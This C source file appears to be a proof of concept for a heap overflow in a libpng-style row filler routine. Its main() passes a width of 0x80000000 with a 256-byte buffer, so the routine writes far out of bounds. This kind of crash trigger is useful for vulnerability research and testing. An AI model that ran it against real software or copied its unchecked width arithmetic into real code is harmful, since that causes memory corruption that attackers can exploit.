#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

typedef struct {
    uint32_t width;
    uint8_t color_type;
    uint8_t bit_depth;
    uint8_t channels;
    uint8_t pixel_depth;
    uint32_t rowbytes;
} png_row_info;

#define PNG_COLOR_TYPE_RGB 2

void png_do_read_filler(png_row_info *row_info, unsigned char *row, uint32_t filler, uint32_t flags) {
    uint32_t i;
    uint32_t row_width = row_info->width;
    unsigned char lo_filler = (unsigned char)filler;

    if (row_info->color_type == PNG_COLOR_TYPE_RGB && row_info->bit_depth == 8) {
        unsigned char *sp = row + (size_t)row_width * 3;
        unsigned char *dp = sp + (size_t)row_width;
        for (i = 0; i < row_width; i++) {
            *(--dp) = lo_filler;
            *(--dp) = *(--sp);
            *(--dp) = *(--sp);
            *(--dp) = *(--sp);
        }
    }
}

int main() {
    png_row_info row_info;
    row_info.width = 0x80000000;
    row_info.color_type = PNG_COLOR_TYPE_RGB;
    row_info.bit_depth = 8;

    size_t row_size = 0x100;
    unsigned char *row = (unsigned char *)malloc(row_size);
    if (!row) {
        perror("malloc");
        return 1;
    }
    for (size_t i = 0; i < row_size; i++) {
        row[i] = 'A';
    }

    png_do_read_filler(&row_info, row, 0x12, 0);

    free(row);
    return 0;
}
